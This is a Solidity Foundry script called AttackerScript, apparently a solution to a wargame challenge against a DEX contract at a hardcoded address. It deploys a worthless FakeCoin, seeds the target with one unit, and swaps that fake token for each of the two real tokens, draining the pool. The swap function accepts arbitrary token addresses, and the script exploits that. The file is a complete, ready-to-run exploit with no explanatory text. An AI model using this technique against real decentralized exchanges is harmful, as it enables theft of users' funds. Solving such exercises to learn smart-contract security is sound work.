// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {FakeCoin} from "src/FakeCoin.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapAmount(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
}

contract AttackerScript is Script {
    
    IDexTwo target;
    address token1;
    address token2;

    function setUp() public {
        target = IDexTwo(0x184d572cc1adc293055B97Fba232cc9ba4c24670);
        token1 = target.token1();
        token2 = target.token2();
    }

    function run() public {
        vm.startBroadcast();

        FakeCoin fakecoin = new FakeCoin();
        fakecoin.transfer(address(target), 1);
        fakecoin.approve(address(target), type(uint256).max);
        
        target.swap(address(fakecoin), token1, 1);
        target.swap(address(fakecoin), token2, 1);

        vm.stopBroadcast();
    }
}
